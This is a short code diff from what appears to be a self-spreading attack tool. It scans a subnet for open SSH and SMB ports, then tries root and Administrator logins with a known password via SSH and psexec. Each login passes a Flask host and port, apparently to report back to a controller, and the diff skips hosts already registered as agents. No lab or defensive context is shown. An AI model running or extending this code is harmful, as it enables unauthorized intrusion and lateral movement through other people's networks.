@@ -200,10 +200,10 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
                     if result == 0:
                         if port == 22:
                             ssh_hosts.append(ip)
-                            atk_logger.info(f"[INFO] SSH (port 22) open on {ip}.")
+                            atk_logger.info(f"[INFO] SSH (port 22) open on {ip}")
                         elif port == 445:
                             smb_hosts.append(ip)
-                            atk_logger.info(f"[INFO] SMB (port 445) open on {ip}.")
+                            atk_logger.info(f"[INFO] SMB (port 445) open on {ip}")
                     else:
                         # print(f"[DEBUG] Port {port} closed on {ip}.")
                         pass
@@ -221,9 +221,14 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
 def perform_attack():
     ssh_hosts, smb_hosts = network_scan(TARGET_SUBNET)
     for host in ssh_hosts:
+        if host in registered_agents_ip:
+            continue
         atk_logger.info(f"Attempting ssh attack for {host}")
         attacks.ssh("root", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
+        attacks.ssh("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
     for host in smb_hosts:
+        if host in registered_agents_ip:
+            continue
         atk_logger.info(f"Attempting smb attack for {host}")
         attacks.psexec("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
     
